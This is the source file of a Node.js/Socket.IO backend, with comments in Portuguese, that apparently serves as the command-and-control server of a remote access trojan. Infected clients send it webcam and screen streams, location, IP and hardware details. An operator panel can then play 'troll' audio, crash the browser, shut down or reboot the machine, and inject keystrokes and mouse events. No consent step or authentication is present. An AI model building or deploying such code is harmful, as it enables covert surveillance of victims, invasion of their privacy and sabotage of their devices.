/* Sukita DL  ·  backend v3.2 */
const express = require('express');
const http    = require('http');
const path    = require('path');
const { v4: uuid } = require('uuid');
const { Server }   = require('socket.io');

const app    = express();
const server = http.createServer(app);
const io     = new Server(server, { cors:{origin:'*'} });

app.use(express.static(path.join(__dirname, 'public')));

/* ─── mapa de clientes ─── */
const clients = new Map();                      // uuid → { socket, … }

/* helper: emitir só para admins */
io.toAdmins = () => ({
  emit: (ev,data) => {
    for(const s of io.sockets.sockets.values())
      if(s.handshake.query.role === 'admin') s.emit(ev,data);
  }
});

/* ─────────────────────────── conexões ─────────────────────────── */
io.on('connection', socket=>{
  const role = socket.handshake.query.role;

  /* ════════════════ CLIENTE (Python ou sp.html) ════════════════ */
  if(role === 'client'){
    const id = uuid();
    const ip = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;
    const ua = socket.handshake.headers['user-agent'] || '—';

    clients.set(id,{ uuid:id, ip, ua, connected_at:Date.now(),
                     socket, watchers:[], screenWatchers:[],
                     location:null, hwinfo:null });

    socket.emit('id', id);
    broadcastClients();

    /* vídeo & tela */
    socket.on('frame',        d=> relay(id,'frame',d,'watchers'));
    socket.on('screen-frame', d=> relay(id,'screen-frame',d,'screenWatchers'));

    /* localização */
    socket.on('location', loc=>{
      const c=clients.get(id); if(c){ c.location=loc; io.toAdmins().emit('location-update',{uuid:id,loc}); }
    });

    /* hardware info */
    socket.on('hwinfo', info=>{
      const c=clients.get(id); if(c){
        c.hwinfo = info;
        broadcastClients();
        io.toAdmins().emit('hwinfo-update',{uuid:id,info});
      }
    });

    socket.on('disconnect', ()=>{ clients.delete(id); broadcastClients(); });
  }

  /* ═════════════════════ ADMIN (painel) ═════════════════════ */
  if(role === 'admin'){
    socket.emit('clients', summary());

    /* pedir / parar streams */
    socket.on('request-stream', uuid=> addWatcher(uuid,socket.id,'watchers'));
    socket.on('stop-stream',    uuid=> delWatcher(uuid,socket.id,'watchers'));
    socket.on('request-screen', uuid=> addWatcher(uuid,socket.id,'screenWatchers'));
    socket.on('stop-screen',    uuid=> delWatcher(uuid,socket.id,'screenWatchers'));

    /* áudio / troll */
    socket.on('ready-audio',  ({uuid,url,delay=0})=> timed(uuid,'play-audio',{url},delay));
    socket.on('custom-audio', ({uuid,dataURL,delay=0})=> timed(uuid,'play-audio',{url:dataURL},delay));
    socket.on('stop-audio',   uuid=> emit(uuid,'stop-audio'));
    socket.on('crash-browser',uuid=> emit(uuid,'crash-browser'));

    /* novo controle / energia / hw info */
    socket.on('request-hwinfo', uuid=> emit(uuid,'request-hwinfo'));
    socket.on('shutdown',       uuid=> emit(uuid,'shutdown'));
    socket.on('reboot',         uuid=> emit(uuid,'reboot'));
    socket.on('mouse-event',    ({uuid,ev})=> emit(uuid,'mouse-event',ev));
    socket.on('key-event',      ({uuid,ev})=> emit(uuid,'key-event',ev));

    /* admin caiu → limpa watchers */
    socket.on('disconnect',()=>{
      for(const c of clients.values()){
        c.watchers       = c.watchers.filter(x=>x!==socket.id);
        c.screenWatchers = c.screenWatchers.filter(x=>x!==socket.id);
      }
    });
  }
});

/* ───────────── helpers gerais ───────────── */
function summary(){
  return Array.from(clients.values()).map(c=>({
    uuid:c.uuid, ip:c.ip, ua:c.ua, connected_at:c.connected_at,
    location:c.location, hwinfo:c.hwinfo
  }));
}
function broadcastClients(){ io.toAdmins().emit('clients', summary()); }

function relay(uuid, evt, data, list){
  const c=clients.get(uuid);
  if(c) c[list].forEach(w=> io.to(w).emit(evt,{id:uuid,data}));
}
function addWatcher(uuid,sid,list){
  const c=clients.get(uuid); if(c && !c[list].includes(sid)) c[list].push(sid);
}
function delWatcher(uuid,sid,list){
  const c=clients.get(uuid); if(c) c[list]=c[list].filter(x=>x!==sid);
}
function emit(uuid,evt,data){ const c=clients.get(uuid); if(c) c.socket.emit(evt,data); }
function timed(uuid,evt,data,delay){ setTimeout(()=>emit(uuid,evt,data),delay*1000); }

/* ─── start ─── */
const PORT = process.env.PORT || 3000;
server.listen(PORT, ()=> console.log(`✔  http://localhost:${PORT}`));
